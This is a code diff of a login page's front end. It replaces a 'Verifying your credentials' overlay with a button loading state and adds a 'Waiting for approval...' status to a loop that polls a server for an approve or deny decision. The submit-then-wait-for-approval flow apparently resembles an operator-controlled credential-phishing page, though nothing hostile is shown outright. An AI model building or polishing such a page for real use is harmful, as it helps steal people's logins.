@@ -11,20 +11,6 @@
 
   <div class="page">
 
-    <div id="verification-overlay" class="verification-overlay hidden" aria-live="polite">
-      <div class="verification-panel">
-        <div class="verification-spinner" aria-hidden="true"></div>
-
-        <div class="verification-title">Verifying your credentials…</div>
-
-        <div class="verification-email" id="verification-email">Checking your account...</div>
-
-        <button type="button" class="verification-cancel" id="verification-cancel">
-          Cancel
-        </button>
-      </div>
-    </div>
-
     <main class="login-card">
 
       <form id="login-form">
@@ -83,7 +69,7 @@
           class="login-btn"
           type="submit"
         >
-          Login
+          <span>Login</span>
         </button>
 
       <!-- Divider -->
@@ -165,20 +151,23 @@
       return `${maskedLocal}@${domain}`;
     }
 
-    function showVerificationOverlay(email) {
-      const overlay = document.getElementById("verification-overlay");
-      const emailLabel = document.getElementById("verification-email");
-
-      emailLabel.textContent = maskEmail(email);
-      overlay.classList.remove("hidden");
-    }
-
-    function hideVerificationOverlay() {
-      const overlay = document.getElementById("verification-overlay");
-      overlay.classList.add("hidden");
-    }
-
     let decisionPollTimer = null;
+
+    function setLoadingState(isLoading) {
+      const loginButton = document.querySelector('.login-btn');
+      const buttonText = loginButton.querySelector('span');
+
+      if (isLoading) {
+        loginButton.classList.add('loading');
+        loginButton.disabled = true;
+        buttonText.textContent = 'Please wait...';
+        return;
+      }
+
+      loginButton.classList.remove('loading');
+      loginButton.disabled = false;
+      buttonText.textContent = 'Login';
+    }
 
     function setStatusMessage(message, type) {
       const statusMessage = document.getElementById('status-message');
@@ -204,14 +193,21 @@
           const response = await fetch(`/api/login-status?email=${encodeURIComponent(email)}`);
           const result = await response.json();
 
+          if (result.status === 'pending') {
+            setStatusMessage('Waiting for approval...', 'success');
+            return;
+          }
+
           if (result.status === 'denied') {
             clearInterval(decisionPollTimer);
+            setLoadingState(false);
             setStatusMessage(result.message || 'Login rejected. Please check your credentials and try again.', 'error');
             return;
           }
 
           if (result.status === 'approved') {
             clearInterval(decisionPollTimer);
+            setLoadingState(false);
             setStatusMessage('Login approved.', 'success');
             return;
           }
@@ -233,7 +229,7 @@
       }
 
       clearStatusMessage();
-      showVerificationOverlay(email);
+      setLoadingState(true);
       verificationController = new AbortController();
 
       try {
@@ -260,36 +256,27 @@
           throw new Error(result.message || `Request failed with status ${response.status}.`);
         }
 
-        hideVerificationOverlay();
         pollLoginDecision(email);
-        setStatusMessage("Login submitted successfully.", "success");
+        setStatusMessage("Waiting for approval...", "success");
         document.getElementById("login-form").reset();
       } catch (error) {
         if (error.name === "AbortError") {
-          hideVerificationOverlay();
+          setLoadingState(false);
           return;
         }
 
         console.error(error);
-        hideVerificationOverlay();
+        setLoadingState(false);
         setStatusMessage(error.message || "Unable to submit login request.", "error");
       }
     }
 
     document.getElementById("login-form").addEventListener("submit", submitLogin);
-    document.getElementById("verification-cancel").addEventListener("click", () => {
-      if (decisionPollTimer) {
-        clearInterval(decisionPollTimer);
-        decisionPollTimer = null;
-      }
-
-      if (verificationController) {
-        verificationController.abort();
-        verificationController = null;
-      }
-
-      hideVerificationOverlay();
-      clearStatusMessage();
+    document.addEventListener("DOMContentLoaded", () => {
+      const loginButton = document.querySelector('.login-btn');
+      const buttonText = loginButton.querySelector('span');
+      loginButton.setAttribute('data-label', 'Login');
+      buttonText.textContent = 'Login';
     });
 
     function demoMessage() {
